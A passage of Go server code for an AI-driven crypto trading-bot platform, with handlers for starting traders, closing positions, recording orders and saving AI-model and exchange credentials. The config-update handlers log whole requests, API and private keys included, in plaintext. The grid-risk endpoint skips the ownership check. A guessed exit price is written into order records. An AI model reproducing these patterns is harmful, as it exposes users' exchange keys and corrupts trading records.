		if isRunning, ok := status["is_running"].(bool); ok && isRunning {
			trader.Stop()
			logger.Infof("⏹  Stopped running trader: %s", traderID)
		}
	}

	// Remove trader from memory
	s.traderManager.RemoveTrader(traderID)

	logger.Infof("✓ Trader deleted: %s", traderID)
	c.JSON(http.StatusOK, gin.H{"message": "Trader deleted"})
}

// handleStartTrader Start trader
func (s *Server) handleStartTrader(c *gin.Context) {
	userID := c.GetString("user_id")
	traderID := c.Param("id")

	// Verify trader belongs to current user
	_, err := s.store.Trader().GetFullConfig(userID, traderID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Trader does not exist or no access permission"})
		return
	}

	// Check if trader exists in memory and if it's running
	existingTrader, _ := s.traderManager.GetTrader(traderID)
	if existingTrader != nil {
		status := existingTrader.GetStatus()
		if isRunning, ok := status["is_running"].(bool); ok && isRunning {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Trader is already running"})
			return
		}
		// Trader exists but is stopped - remove from memory to reload fresh config
		logger.Infof("🔄 Removing stopped trader %s from memory to reload config...", traderID)
		s.traderManager.RemoveTrader(traderID)
	}

	// Load trader from database (always reload to get latest config)
	logger.Infof("🔄 Loading trader %s from database...", traderID)
	if loadErr := s.traderManager.LoadUserTradersFromStore(s.store, userID); loadErr != nil {
		logger.Infof("❌ Failed to load user traders: %v", loadErr)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to load trader: " + loadErr.Error()})
		return
	}

	trader, err := s.traderManager.GetTrader(traderID)
	if err != nil {
		// Check detailed reason
		fullCfg, _ := s.store.Trader().GetFullConfig(userID, traderID)
		if fullCfg != nil && fullCfg.Trader != nil {
			// Check strategy
			if fullCfg.Strategy == nil {
				c.JSON(http.StatusBadRequest, gin.H{"error": "策略配置不完整，请先关联有效策略"})
				return
			}
			// Check AI model
			if fullCfg.AIModel == nil {
				c.JSON(http.StatusBadRequest, gin.H{"error": "Trader's AI model does not exist, please check AI model configuration"})
				return
			}
			if !fullCfg.AIModel.Enabled {
				c.JSON(http.StatusBadRequest, gin.H{"error": "Trader's AI model is not enabled, please enable the AI model first"})
				return
			}
			// Check exchange
			if fullCfg.Exchange == nil {
				c.JSON(http.StatusBadRequest, gin.H{"error": "Trader's exchange does not exist, please check exchange configuration"})
				return
			}
			if !fullCfg.Exchange.Enabled {
				c.JSON(http.StatusBadRequest, gin.H{"error": "Trader's exchange is not enabled, please enable the exchange first"})
				return
			}
		}
		// Check if there's a specific load error
		if loadErr := s.traderManager.GetLoadError(traderID); loadErr != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to load trader: " + loadErr.Error()})
			return
		}
		c.JSON(http.StatusNotFound, gin.H{"error": "Failed to load trader, please check AI model, exchange and strategy configuration"})
		return
	}

	// Start trader
	go func() {
		logger.Infof("▶️  Starting trader %s (%s)", traderID, trader.GetName())
		if err := trader.Run(); err != nil {
			logger.Infof("❌ Trader %s runtime error: %v", trader.GetName(), err)
		}
	}()

	// Update running status in database
	err = s.store.Trader().UpdateStatus(userID, traderID, true)
	if err != nil {
		logger.Infof("⚠️  Failed to update trader status: %v", err)
	}

	logger.Infof("✓ Trader %s started", trader.GetName())
	c.JSON(http.StatusOK, gin.H{"message": "Trader started"})
}

// handleStopTrader Stop trader
func (s *Server) handleStopTrader(c *gin.Context) {
	userID := c.GetString("user_id")
	traderID := c.Param("id")

	// Verify trader belongs to current user
	_, err := s.store.Trader().GetFullConfig(userID, traderID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Trader does not exist or no access permission"})
		return
	}

	trader, err := s.traderManager.GetTrader(traderID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Trader does not exist"})
		return
	}

	// Check if trader is running
	status := trader.GetStatus()
	if isRunning, ok := status["is_running"].(bool); ok && !isRunning {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Trader is already stopped"})
		return
	}

	// Stop trader
	trader.Stop()

	// Update running status in database
	err = s.store.Trader().UpdateStatus(userID, traderID, false)
	if err != nil {
		logger.Infof("⚠️  Failed to update trader status: %v", err)
	}

	logger.Infof("⏹  Trader %s stopped", trader.GetName())
	c.JSON(http.StatusOK, gin.H{"message": "Trader stopped"})
}

// handleUpdateTraderPrompt Update trader custom prompt
func (s *Server) handleUpdateTraderPrompt(c *gin.Context) {
	traderID := c.Param("id")
	userID := c.GetString("user_id")

	var req struct {
		CustomPrompt       string `json:"custom_prompt"`
		OverrideBasePrompt bool   `json:"override_base_prompt"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		SafeBadRequest(c, "Invalid request parameters")
		return
	}

	// Update database
	err := s.store.Trader().UpdateCustomPrompt(userID, traderID, req.CustomPrompt, req.OverrideBasePrompt)
	if err != nil {
		SafeInternalError(c, "Failed to update custom prompt", err)
		return
	}

	// If trader is in memory, update its custom prompt and override settings
	trader, err := s.traderManager.GetTrader(traderID)
	if err == nil {
		trader.SetCustomPrompt(req.CustomPrompt)
		trader.SetOverrideBasePrompt(req.OverrideBasePrompt)
		logger.Infof("✓ Updated trader %s custom prompt (override base=%v)", trader.GetName(), req.OverrideBasePrompt)
	}

	c.JSON(http.StatusOK, gin.H{"message": "Custom prompt updated"})
}

// handleToggleCompetition Toggle trader competition visibility
func (s *Server) handleToggleCompetition(c *gin.Context) {
	traderID := c.Param("id")
	userID := c.GetString("user_id")

	var req struct {
		ShowInCompetition bool `json:"show_in_competition"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		SafeBadRequest(c, "Invalid request parameters")
		return
	}

	// Update database
	err := s.store.Trader().UpdateShowInCompetition(userID, traderID, req.ShowInCompetition)
	if err != nil {
		SafeInternalError(c, "Update competition visibility", err)
		return
	}

	// Update in-memory trader if it exists
	if trader, err := s.traderManager.GetTrader(traderID); err == nil {
		trader.SetShowInCompetition(req.ShowInCompetition)
	}

	status := "shown"
	if !req.ShowInCompetition {
		status = "hidden"
	}
	logger.Infof("✓ Trader %s competition visibility updated: %s", traderID, status)
	c.JSON(http.StatusOK, gin.H{
		"message":             "Competition visibility updated",
		"show_in_competition": req.ShowInCompetition,
	})
}

// handleGetGridRiskInfo returns current risk information for a grid trader
func (s *Server) handleGetGridRiskInfo(c *gin.Context) {
	traderID := c.Param("id")

	autoTrader, err := s.traderManager.GetTrader(traderID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "trader not found"})
		return
	}

	riskInfo := autoTrader.GetGridRiskInfo()
	c.JSON(http.StatusOK, riskInfo)
}

// handleSyncBalance Sync exchange balance to initial_balance (Option B: Manual Sync + Option C: Smart Detection)
func (s *Server) handleSyncBalance(c *gin.Context) {
	userID := c.GetString("user_id")
	traderID := c.Param("id")

	logger.Infof("🔄 User %s requested balance sync for trader %s", userID, traderID)

	// Get trader configuration from database (including exchange info)
	fullConfig, err := s.store.Trader().GetFullConfig(userID, traderID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Trader does not exist"})
		return
	}

	traderConfig := fullConfig.Trader
	exchangeCfg := fullConfig.Exchange

	if exchangeCfg == nil || !exchangeCfg.Enabled {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Exchange not configured or not enabled"})
		return
	}

	tempTrader, createErr := s.createTempTraderFromExchangeConfig(exchangeCfg, userID)
	if createErr != nil {
		logger.Infof("⚠️ Failed to create temporary trader: %v", createErr)
		SafeInternalError(c, "Failed to connect to exchange", createErr)
		return
	}
	if tempTrader == nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Unsupported exchange type"})
		return
	}

	// Query actual balance
	balanceInfo, balanceErr := tempTrader.GetBalance()
	if balanceErr != nil {
		logger.Infof("⚠️ Failed to query exchange balance: %v", balanceErr)
		SafeInternalError(c, "Failed to query balance", balanceErr)
		return
	}

	// Extract total equity (for P&L calculation, we need total account value, not available balance)
	var actualBalance float64
	// Priority: total_equity > totalWalletBalance > wallet_balance > totalEq > balance
	balanceKeys := []string{"total_equity", "totalWalletBalance", "wallet_balance", "totalEq", "balance"}
	for _, key := range balanceKeys {
		if balance, ok := balanceInfo[key].(float64); ok && balance > 0 {
			actualBalance = balance
			break
		}
	}
	if actualBalance <= 0 {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Unable to get total equity"})
		return
	}

	oldBalance := traderConfig.InitialBalance

	// ✅ Option C: Smart balance change detection
	changePercent := ((actualBalance - oldBalance) / oldBalance) * 100
	changeType := "increase"
	if changePercent < 0 {
		changeType = "decrease"
	}

	logger.Infof("✓ Queried actual exchange balance: %.2f USDT (current config: %.2f USDT, change: %.2f%%)",
		actualBalance, oldBalance, changePercent)

	// Update initial_balance in database
	err = s.store.Trader().UpdateInitialBalance(userID, traderID, actualBalance)
	if err != nil {
		logger.Infof("❌ Failed to update initial_balance: %v", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update balance"})
		return
	}

	// Reload traders into memory
	err = s.traderManager.LoadUserTradersFromStore(s.store, userID)
	if err != nil {
		logger.Infof("⚠️ Failed to reload user traders into memory: %v", err)
	}

	logger.Infof("✅ Synced balance: %.2f → %.2f USDT (%s %.2f%%)", oldBalance, actualBalance, changeType, changePercent)

	c.JSON(http.StatusOK, gin.H{
		"message":        "Balance synced successfully",
		"old_balance":    oldBalance,
		"new_balance":    actualBalance,
		"change_percent": changePercent,
		"change_type":    changeType,
	})
}

// handleClosePosition One-click close position
func (s *Server) handleClosePosition(c *gin.Context) {
	userID := c.GetString("user_id")
	traderID := c.Param("id")

	var req struct {
		Symbol string `json:"symbol" binding:"required"`
		Side   string `json:"side" binding:"required"` // "LONG" or "SHORT"
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Parameter error: symbol and side are required"})
		return
	}

	logger.Infof("🔻 User %s requested position close: trader=%s, symbol=%s, side=%s", userID, traderID, req.Symbol, req.Side)

	// Get trader configuration from database (including exchange info)
	fullConfig, err := s.store.Trader().GetFullConfig(userID, traderID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Trader does not exist"})
		return
	}

	// 模拟盘：调用内存中的 AutoTrader.EmergencyClosePositionDryRun，不请求交易所
	if fullConfig.Trader != nil && fullConfig.Trader.IsDryRun {
		autoTrader, getErr := s.traderManager.GetTrader(traderID)
		if getErr != nil || autoTrader == nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Paper trader not loaded, try starting the trader first"})
			return
		}
		side := strings.ToLower(req.Side)
		if closeErr := autoTrader.EmergencyClosePositionDryRun(req.Symbol, side); closeErr != nil {
			logger.Infof("❌ Paper close failed: symbol=%s, side=%s, error=%v", req.Symbol, req.Side, closeErr)
			SafeInternalError(c, "Close paper position", closeErr)
			return
		}
		logger.Infof("✅ Paper position closed: symbol=%s, side=%s", req.Symbol, req.Side)
		c.JSON(http.StatusOK, gin.H{
			"message": "Position closed successfully (Paper)",
			"symbol":  req.Symbol,
			"side":    req.Side,
		})
		return
	}

	exchangeCfg := fullConfig.Exchange

	if exchangeCfg == nil || !exchangeCfg.Enabled {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Exchange not configured or not enabled"})
		return
	}

	tempTrader, createErr := s.createTempTraderFromExchangeConfig(exchangeCfg, userID)
	if createErr != nil {
		logger.Infof("⚠️ Failed to create temporary trader: %v", createErr)
		SafeInternalError(c, "Failed to connect to exchange", createErr)
		return
	}
	if tempTrader == nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Unsupported exchange type"})
		return
	}

	// Get current position info BEFORE closing (to get quantity and price)
	positions, err := tempTrader.GetPositions()
	if err != nil {
		logger.Infof("⚠️ Failed to get positions: %v", err)
	}

	var posQty float64
	var entryPrice float64
	for _, pos := range positions {
		if pos["symbol"] == req.Symbol && pos["side"] == strings.ToLower(req.Side) {
			if amt, ok := pos["positionAmt"].(float64); ok {
				posQty = amt
				if posQty < 0 {
					posQty = -posQty // Make positive
				}
			}
			if price, ok := pos["entryPrice"].(float64); ok {
				entryPrice = price
			}
			break
		}
	}

	// Execute close position operation
	var result map[string]interface{}
	var closeErr error

	if req.Side == "LONG" {
		result, closeErr = tempTrader.CloseLong(req.Symbol, 0) // 0 means close all
	} else if req.Side == "SHORT" {
		result, closeErr = tempTrader.CloseShort(req.Symbol, 0) // 0 means close all
	} else {
		c.JSON(http.StatusBadRequest, gin.H{"error": "side must be LONG or SHORT"})
		return
	}

	if closeErr != nil {
		logger.Infof("❌ Close position failed: symbol=%s, side=%s, error=%v", req.Symbol, req.Side, closeErr)
		SafeInternalError(c, "Close position", closeErr)
		return
	}

	logger.Infof("✅ Position closed successfully: symbol=%s, side=%s, qty=%.6f, result=%v", req.Symbol, req.Side, posQty, result)

	// Record order to database (for chart markers and history)
	s.recordClosePositionOrder(traderID, exchangeCfg.ID, exchangeCfg.ExchangeType, req.Symbol, req.Side, posQty, entryPrice, result)

	c.JSON(http.StatusOK, gin.H{
		"message": "Position closed successfully",
		"symbol":  req.Symbol,
		"side":    req.Side,
		"result":  result,
	})
}

// recordClosePositionOrder Record close position order to database (Lighter version - direct FILLED status)
func (s *Server) recordClosePositionOrder(traderID, exchangeID, exchangeType, symbol, side string, quantity, exitPrice float64, result map[string]interface{}) {
	// Skip for exchanges with OrderSync - let the background sync handle it to avoid duplicates
	switch exchangeType {
	case "binance", "lighter", "hyperliquid", "bybit", "okx", "bitget", "aster", "gate":
		logger.Infof("  📝 Close order will be synced by OrderSync, skipping immediate record")
		return
	}

	// Check if order was placed (skip if NO_POSITION)
	status, _ := result["status"].(string)
	if status == "NO_POSITION" {
		logger.Infof("  ⚠️ No position to close, skipping order record")
		return
	}

	// Get order ID from result
	var orderID string
	switch v := result["orderId"].(type) {
	case int64:
		orderID = fmt.Sprintf("%d", v)
	case float64:
		orderID = fmt.Sprintf("%.0f", v)
	case string:
		orderID = v
	default:
		orderID = fmt.Sprintf("%v", v)
	}

	if orderID == "" || orderID == "0" {
		logger.Infof("  ⚠️ Order ID is empty, skipping record")
		return
	}

	// Determine order action based on side
	var orderAction string
	if side == "LONG" {
		orderAction = "close_long"
	} else {
		orderAction = "close_short"
	}

	// Use entry price if exit price not available
	if exitPrice == 0 {
		exitPrice = quantity * 100 // Rough estimate if we don't have price
	}

	// Estimate fee (0.04% for Lighter taker)
	fee := exitPrice * quantity * 0.0004

	// Create order record - DIRECTLY as FILLED (Lighter market orders fill immediately)
	orderRecord := &store.TraderOrder{
		TraderID:        traderID,
		ExchangeID:      exchangeID,
		ExchangeType:    exchangeType,
		ExchangeOrderID: orderID,
		Symbol:          symbol,
		PositionSide:    side,
		OrderAction:     orderAction,
		Type:            "MARKET",
		Side:            getSideFromAction(orderAction),
		Quantity:        quantity,
		Price:           0, // Market order
		Status:          "FILLED",
		FilledQuantity:  quantity,
		AvgFillPrice:    exitPrice,
		Commission:      fee,
		FilledAt:        time.Now().UTC().UnixMilli(),
		CreatedAt:       time.Now().UTC().UnixMilli(),
		UpdatedAt:       time.Now().UTC().UnixMilli(),
	}

	if err := s.store.Order().CreateOrder(orderRecord); err != nil {
		logger.Infof("  ⚠️ Failed to record order: %v", err)
		return
	}

	logger.Infof("  ✅ Order recorded as FILLED: %s [%s] %s qty=%.6f price=%.6f", orderID, orderAction, symbol, quantity, exitPrice)

	// Create fill record immediately
	tradeID := fmt.Sprintf("%s-%d", orderID, time.Now().UnixNano())
	fillRecord := &store.TraderFill{
		TraderID:        traderID,
		ExchangeID:      exchangeID,
		ExchangeType:    exchangeType,
		OrderID:         orderRecord.ID,
		ExchangeOrderID: orderID,
		ExchangeTradeID: tradeID,
		Symbol:          symbol,
		Side:            getSideFromAction(orderAction),
		Price:           exitPrice,
		Quantity:        quantity,
		QuoteQuantity:   exitPrice * quantity,
		Commission:      fee,
		CommissionAsset: "USDT",
		RealizedPnL:     0,
		IsMaker:         false,
		CreatedAt:       time.Now().UTC().UnixMilli(),
	}

	if err := s.store.Order().CreateFill(fillRecord); err != nil {
		logger.Infof("  ⚠️ Failed to record fill: %v", err)
	} else {
		logger.Infof("  ✅ Fill record created: price=%.6f qty=%.6f", exitPrice, quantity)
	}
}

// pollAndUpdateOrderStatus Poll order status and update with fill data
func (s *Server) pollAndUpdateOrderStatus(orderRecordID int64, traderID, exchangeID, exchangeType, orderID, symbol, orderAction string, tempTrader trader.Trader) {
	var actualPrice float64
	var actualQty float64
	var fee float64

	// Wait a bit for order to be filled
	time.Sleep(500 * time.Millisecond)

	// For Lighter, use GetTrades instead of GetOrderStatus (market orders are filled immediately)
	if exchangeType == "lighter" {
		s.pollLighterTradeHistory(orderRecordID, traderID, exchangeID, exchangeType, orderID, symbol, orderAction, tempTrader)
		return
	}

	// For other exchanges, poll GetOrderStatus
	for i := 0; i < 5; i++ {
		status, err := tempTrader.GetOrderStatus(symbol, orderID)
		if err != nil {
			logger.Infof("  ⚠️ GetOrderStatus failed (attempt %d/5): %v", i+1, err)
			time.Sleep(500 * time.Millisecond)
			continue
		}
		if err == nil {
			statusStr, _ := status["status"].(string)
			if statusStr == "FILLED" {
				// Get actual fill price
				if avgPrice, ok := status["avgPrice"].(float64); ok && avgPrice > 0 {
					actualPrice = avgPrice
				}
				// Get actual executed quantity
				if execQty, ok := status["executedQty"].(float64); ok && execQty > 0 {
					actualQty = execQty
				}
				// Get commission/fee
				if commission, ok := status["commission"].(float64); ok {
					fee = commission
				}

				logger.Infof("  ✅ Order filled: avgPrice=%.6f, qty=%.6f, fee=%.6f", actualPrice, actualQty, fee)

				// Update order status to FILLED
				if err := s.store.Order().UpdateOrderStatus(orderRecordID, "FILLED", actualQty, actualPrice, fee); err != nil {
					logger.Infof("  ⚠️ Failed to update order status: %v", err)
					return
				}

				// Record fill details
				tradeID := fmt.Sprintf("%s-%d", orderID, time.Now().UnixNano())
				fillRecord := &store.TraderFill{
					TraderID:        traderID,
					ExchangeID:      exchangeID,
					ExchangeType:    exchangeType,
					OrderID:         orderRecordID,
					ExchangeOrderID: orderID,
					ExchangeTradeID: tradeID,
					Symbol:          symbol,
					Side:            getSideFromAction(orderAction),
					Price:           actualPrice,
					Quantity:        actualQty,
					QuoteQuantity:   actualPrice * actualQty,
					Commission:      fee,
					CommissionAsset: "USDT",
					RealizedPnL:     0,
					IsMaker:         false,
					CreatedAt:       time.Now().UTC().UnixMilli(),
				}

				if err := s.store.Order().CreateFill(fillRecord); err != nil {
					logger.Infof("  ⚠️ Failed to record fill: %v", err)
				} else {
					logger.Infof("  📝 Fill recorded: price=%.6f, qty=%.6f", actualPrice, actualQty)
				}

				return
			} else if statusStr == "CANCELED" || statusStr == "EXPIRED" || statusStr == "REJECTED" {
				logger.Infof("  ⚠️ Order %s, updating status", statusStr)
				s.store.Order().UpdateOrderStatus(orderRecordID, statusStr, 0, 0, 0)
				return
			}
		}
		time.Sleep(500 * time.Millisecond)
	}

	logger.Infof("  ⚠️ Failed to confirm order fill after polling, order may still be pending")
}

// pollLighterTradeHistory No longer used - Lighter orders are marked as FILLED immediately
// Keeping this function stub for compatibility with other exchanges
func (s *Server) pollLighterTradeHistory(orderRecordID int64, traderID, exchangeID, exchangeType, orderID, symbol, orderAction string, tempTrader trader.Trader) {
	// For Lighter, orders are now recorded as FILLED immediately in recordClosePositionOrder
	// This function is no longer called for Lighter exchange
	logger.Infof("  ℹ️ pollLighterTradeHistory called but not needed (order already marked FILLED)")
}

// getSideFromAction Get order side (BUY/SELL) from order action
func getSideFromAction(action string) string {
	switch action {
	case "open_long", "close_short":
		return "BUY"
	case "open_short", "close_long":
		return "SELL"
	default:
		return "BUY"
	}
}

// handleGetModelConfigs Get AI model configurations
func (s *Server) handleGetModelConfigs(c *gin.Context) {
	userID := c.GetString("user_id")
	logger.Infof("🔍 Querying AI model configs for user %s", userID)
	models, err := s.store.AIModel().List(userID)
	if err != nil {
		logger.Infof("❌ Failed to get AI model configs: %v", err)
		SafeInternalError(c, "Failed to get AI model configs", err)
		return
	}

	// If no models in database, return default models
	if len(models) == 0 {
		logger.Infof("⚠️ No AI models in database, returning defaults")
		defaultModels := []SafeModelConfig{
			{ID: "deepseek", Name: "DeepSeek AI", Provider: "deepseek", Enabled: false},
			{ID: "qwen", Name: "Qwen AI", Provider: "qwen", Enabled: false},
			{ID: "openai", Name: "OpenAI", Provider: "openai", Enabled: false},
			{ID: "claude", Name: "Claude AI", Provider: "claude", Enabled: false},
			{ID: "gemini", Name: "Gemini AI", Provider: "gemini", Enabled: false},
			{ID: "grok", Name: "Grok AI", Provider: "grok", Enabled: false},
			{ID: "kimi", Name: "Kimi AI", Provider: "kimi", Enabled: false},
			{ID: "minimax", Name: "MiniMax AI", Provider: "minimax", Enabled: false},
		}
		c.JSON(http.StatusOK, defaultModels)
		return
	}

	logger.Infof("✅ Found %d AI model configs", len(models))

	// Convert to safe response structure, remove sensitive information
	safeModels := make([]SafeModelConfig, len(models))
	for i, model := range models {
		safeModels[i] = SafeModelConfig{
			ID:              model.ID,
			Name:            model.Name,
			Provider:        model.Provider,
			Enabled:         model.Enabled,
			CustomAPIURL:    model.CustomAPIURL,
			CustomModelName: model.CustomModelName,
		}
	}

	c.JSON(http.StatusOK, safeModels)
}

// handleUpdateModelConfigs Update AI model configurations (supports both encrypted and plain text based on config)
func (s *Server) handleUpdateModelConfigs(c *gin.Context) {
	userID := c.GetString("user_id")
	cfg := config.Get()

	// Read raw request body
	bodyBytes, err := c.GetRawData()
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Failed to read request body"})
		return
	}

	var req UpdateModelConfigRequest

	// Check if transport encryption is enabled
	if !cfg.TransportEncryption {
		// Transport encryption disabled, accept plain JSON
		if err := json.Unmarshal(bodyBytes, &req); err != nil {
			logger.Infof("❌ Failed to parse plain JSON request: %v", err)
			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request format"})
			return
		}
		logger.Infof("📝 Received plain text model config (UserID: %s)", userID)
	} else {
		// Transport encryption enabled, require encrypted payload
		var encryptedPayload crypto.EncryptedPayload
		if err := json.Unmarshal(bodyBytes, &encryptedPayload); err != nil {
			logger.Infof("❌ Failed to parse encrypted payload: %v", err)
			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request format, encrypted transmission required"})
			return
		}

		// Verify encrypted data
		if encryptedPayload.WrappedKey == "" {
			logger.Infof("❌ Detected unencrypted request (UserID: %s)", userID)
			c.JSON(http.StatusBadRequest, gin.H{
				"error":   "This endpoint only supports encrypted transmission, please use encrypted client",
				"code":    "ENCRYPTION_REQUIRED",
				"message": "Encrypted transmission is required for security reasons",
			})
			return
		}

		// Decrypt data（加密服务未启用时拒绝加密请求，前端应使用明文模式）
		if s.cryptoHandler.cryptoService == nil {
			c.JSON(http.StatusServiceUnavailable, gin.H{"error": "Encryption service unavailable, please use plaintext mode"})
			return
		}
		decrypted, err := s.cryptoHandler.cryptoService.DecryptSensitiveData(&encryptedPayload)
		if err != nil {
			logger.Infof("❌ Failed to decrypt model config (UserID: %s): %v", userID, err)
			c.JSON(http.StatusBadRequest, gin.H{"error": "Failed to decrypt data"})
			return
		}

		// Parse decrypted data
		if err := json.Unmarshal([]byte(decrypted), &req); err != nil {
			logger.Infof("❌ Failed to parse decrypted data: %v", err)
			c.JSON(http.StatusBadRequest, gin.H{"error": "Failed to parse decrypted data"})
			return
		}
		logger.Infof("🔓 Decrypted model config data (UserID: %s)", userID)
	}

	// Update each model's configuration and track traders that need reload
	tradersToReload := make(map[string]bool)
	for modelID, modelData := range req.Models {
		// Find traders using this AI model BEFORE updating
		traders, _ := s.store.Trader().ListByAIModelID(userID, modelID)
		for _, t := range traders {
			tradersToReload[t.ID] = true
		}

		err := s.store.AIModel().Update(userID, modelID, modelData.Enabled, modelData.APIKey, modelData.CustomAPIURL, modelData.CustomModelName)
		if err != nil {
			SafeInternalError(c, fmt.Sprintf("Update model %s", modelID), err)
			return
		}
	}

	// Remove affected traders from memory BEFORE reloading to pick up new config
	for traderID := range tradersToReload {
		logger.Infof("🔄 Removing trader %s from memory to reload with new AI model config", traderID)
		s.traderManager.RemoveTrader(traderID)
	}

	// Reload all traders for this user to make new config take effect immediately
	err = s.traderManager.LoadUserTradersFromStore(s.store, userID)
	if err != nil {
		logger.Infof("⚠️ Failed to reload user traders into memory: %v", err)
		// Don't return error here since model config was successfully updated to database
	}

	logger.Infof("✓ AI model config updated: %+v", req.Models)
	c.JSON(http.StatusOK, gin.H{"message": "Model configuration updated"})
}

// handleGetExchangeConfigs Get exchange configurations
func (s *Server) handleGetExchangeConfigs(c *gin.Context) {
	userID := c.GetString("user_id")
	logger.Infof("🔍 Querying exchange configs for user %s", userID)
	exchanges, err := s.store.Exchange().List(userID)
	if err != nil {
		SafeInternalError(c, "Failed to get exchange configs", err)
		return
	}

	// If no exchanges in database, return empty array (user needs to create accounts)
	if len(exchanges) == 0 {
		logger.Infof("⚠️ No exchanges in database for user %s", userID)
		c.JSON(http.StatusOK, []SafeExchangeConfig{})
		return
	}

	logger.Infof("✅ Found %d exchange configs", len(exchanges))

	// Convert to safe response structure, remove sensitive information
	safeExchanges := make([]SafeExchangeConfig, len(exchanges))
	for i, exchange := range exchanges {
		safeExchanges[i] = SafeExchangeConfig{
			ID:                    exchange.ID,
			ExchangeType:          exchange.ExchangeType,
			AccountName:           exchange.AccountName,
			Name:                  exchange.Name,
			Type:                  exchange.Type,
			Enabled:               exchange.Enabled,
			Testnet:               exchange.Testnet,
			HyperliquidWalletAddr: exchange.HyperliquidWalletAddr,
			AsterUser:             exchange.AsterUser,
			AsterSigner:           exchange.AsterSigner,
			LighterWalletAddr:     exchange.LighterWalletAddr,
		}
	}

	c.JSON(http.StatusOK, safeExchanges)
}

// handleUpdateExchangeConfigs Update exchange configurations (supports both encrypted and plain text based on config)
func (s *Server) handleUpdateExchangeConfigs(c *gin.Context) {
	userID := c.GetString("user_id")
	cfg := config.Get()

	// Read raw request body
	bodyBytes, err := c.GetRawData()
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Failed to read request body"})
		return
	}

	var req UpdateExchangeConfigRequest

	// Check if transport encryption is enabled
	if !cfg.TransportEncryption {
		// Transport encryption disabled, accept plain JSON
		if err := json.Unmarshal(bodyBytes, &req); err != nil {
			logger.Infof("❌ Failed to parse plain JSON request: %v", err)
			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request format"})
			return
		}
		logger.Infof("📝 Received plain text exchange config (UserID: %s)", userID)
	} else {
		// Transport encryption enabled, require encrypted payload
		var encryptedPayload crypto.EncryptedPayload
		if err := json.Unmarshal(bodyBytes, &encryptedPayload); err != nil {
			logger.Infof("❌ Failed to parse encrypted payload: %v", err)
			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request format, encrypted transmission required"})
			return
		}

		// Verify encrypted data
		if encryptedPayload.WrappedKey == "" {
			logger.Infof("❌ Detected unencrypted request (UserID: %s)", userID)
			c.JSON(http.StatusBadRequest, gin.H{
				"error":   "This endpoint only supports encrypted transmission, please use encrypted client",
				"code":    "ENCRYPTION_REQUIRED",
				"message": "Encrypted transmission is required for security reasons",
			})
			return
		}

		// Decrypt data（加密服务未启用时拒绝加密请求，前端应使用明文模式）
		if s.cryptoHandler.cryptoService == nil {
			c.JSON(http.StatusServiceUnavailable, gin.H{"error": "Encryption service unavailable, please use plaintext mode"})
			return
		}
		decrypted, err := s.cryptoHandler.cryptoService.DecryptSensitiveData(&encryptedPayload)
		if err != nil {
			logger.Infof("❌ Failed to decrypt exchange config (UserID: %s): %v", userID, err)
			c.JSON(http.StatusBadRequest, gin.H{"error": "Failed to decrypt data"})
			return
		}

		// Parse decrypted data
		if err := json.Unmarshal([]byte(decrypted), &req); err != nil {
			logger.Infof("❌ Failed to parse decrypted data: %v", err)
			c.JSON(http.StatusBadRequest, gin.H{"error": "Failed to parse decrypted data"})
			return
		}
		logger.Infof("🔓 Decrypted exchange config data (UserID: %s)", userID)
	}

	// Update each exchange's configuration and track traders that need reload
	tradersToReload := make(map[string]bool)
	for exchangeID, exchangeData := range req.Exchanges {
		// Find traders using this exchange BEFORE updating
		traders, _ := s.store.Trader().ListByExchangeID(userID, exchangeID)
		for _, t := range traders {
			tradersToReload[t.ID] = true
		}

		err := s.store.Exchange().Update(userID, exchangeID, exchangeData.Enabled, exchangeData.APIKey, exchangeData.SecretKey, exchangeData.Passphrase, exchangeData.Testnet, exchangeData.HyperliquidWalletAddr, exchangeData.AsterUser, exchangeData.AsterSigner, exchangeData.AsterPrivateKey, exchangeData.LighterWalletAddr, exchangeData.LighterPrivateKey, exchangeData.LighterAPIKeyPrivateKey, exchangeData.LighterAPIKeyIndex)
		if err != nil {
			SafeInternalError(c, fmt.Sprintf("Update exchange %s", exchangeID), err)
			return
		}
	}

	// Remove affected traders from memory BEFORE reloading to pick up new config
	for traderID := range tradersToReload {
		logger.Infof("🔄 Removing trader %s from memory to reload with new exchange config", traderID)
		s.traderManager.RemoveTrader(traderID)
	}

	// Reload all traders for this user to make new config take effect immediately
	err = s.traderManager.LoadUserTradersFromStore(s.store, userID)
	if err != nil {
		logger.Infof("⚠️ Failed to reload user traders into memory: %v", err)
		// Don't return error here since exchange config was successfully updated to database
	}

	logger.Infof("✓ Exchange config updated: %+v", req.Exchanges)
	c.JSON(http.StatusOK, gin.H{"message": "Exchange configuration updated"})
}

// CreateExchangeRequest request structure for creating a new exchange account
type CreateExchangeRequest struct {
	ExchangeType            string `json:"exchange_type" binding:"required"` // "binance", "bybit", "okx", "hyperliquid", "aster", "lighter"
	AccountName             string `json:"account_name"`                     // User-defined account name
	Enabled                 bool   `json:"enabled"`
	APIKey                  string `json:"api_key"`
	SecretKey               string `json:"secret_key"`
	Passphrase              string `json:"passphrase"`
	Testnet                 bool   `json:"testnet"`
